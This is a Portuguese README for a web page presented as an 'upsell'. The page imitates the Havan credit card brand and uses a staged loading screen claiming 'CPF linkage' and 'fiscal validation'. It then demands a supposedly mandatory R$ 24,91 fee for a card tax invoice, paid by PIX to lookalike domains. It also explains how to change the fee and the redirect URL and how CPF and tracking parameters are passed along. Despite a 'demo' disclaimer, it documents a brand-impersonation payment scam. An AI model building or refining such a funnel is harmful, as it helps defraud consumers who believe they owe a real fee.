# Upsell 07 - Emissão de Nota Fiscal do Cartão

## Descrição

Este é um aplicativo web que apresenta a oferta de emissão de nota fiscal eletrônica para o cartão de crédito Havan, desenvolvido como página de upsell.

## Características

- **Design Responsivo**: Funciona perfeitamente em desktop e mobile
- **Cores da Marca Havan**: Utiliza as cores oficiais (azul/roxo) da Havan
- **Loading Screen**: Animação de progresso com 3 etapas
- **Dados Realistas**: Apresentação profissional com justificativa fiscal
- **Interações Realistas**: Animações, notificações e modal de pagamento
- **Ponto de Upsell**: Botão "Emitir Nota Fiscal e Continuar" que redireciona para checkout PIX
- **Taxa Obrigatória**: R$ 24,91 para emissão de nota fiscal
- **Integração Duttyfy**: Checkout PIX via API de pagamentos seguros

## Estrutura dos Arquivos

```
upsell/07/
├── index.html           # Página principal com loading e upsell
├── checkout.html        # Página de checkout PIX
├── upsell-styles.css    # Estilos responsivos
├── upsell-script.js     # Funcionalidades e animações
└── README.md            # Este arquivo
```

## Fluxo da Página

1. **Loading Screen** (7 segundos)
   - Vínculo de CPF
   - Geração de Nota Fiscal
   - Validação Fiscal

2. **Upsell Screen**
   - Título persuasivo
   - Explicação do motivo
   - Preço destacado (R$ 24,91)
   - Benefícios listados
   - Botão de CTA

3. **Checkout**
   - QR Code PIX
   - Código copia e cola
   - Polling de status
   - Redirecionamento após pagamento

## Configuração

### Alterar Valor da Taxa

No arquivo `checkout.html`, localize a constante `UPSELL_CONFIG`:

```javascript
const UPSELL_CONFIG = {
    title: "Emissão de Nota Fiscal do Cartão",
    desc: "Taxa única para emissão e armazenamento da documentação fiscal.",
    amount: 2491 // em centavos (R$ 24,91)
};
```

### Alterar URL de Redirecionamento

No arquivo `upsell-script.js`, localize a função `redirectToAccountPayment()`:

```javascript
const paymentUrl = 'https://pay.pag-certo-online.shop/NF_HAVAN';
```

## Integração com API Duttyfy

O checkout utiliza a API de pagamentos seguros:
- **Endpoint**: `https://www.pagamentos-seguros.app/api-pix/`
- **Método**: POST para gerar PIX, GET para verificar status
- **Polling**: A cada 5 segundos para verificar pagamento

## Parâmetros UTM

A página propaga automaticamente os parâmetros UTM e CPF através de:
- Links internos
- Formulários
- Query strings

Parâmetros suportados: `utm_*`, `cpf`, `fbclid`, `gclid`

## Compatibilidade

- ✅ Chrome/Edge/Safari/Firefox
- ✅ iOS Safari
- ✅ Android Chrome
- ✅ Tablets e desktops
- ✅ Qualquer servidor web (HTML/CSS/JS puro)

## Notas Importantes

- Este é um aplicativo de demonstração/upsell
- Não possui funcionalidades bancárias reais
- Todos os dados são fictícios
- Desenvolvido especificamente para conversão de vendas
- Requer integração com API de pagamentos real para funcionar completamente
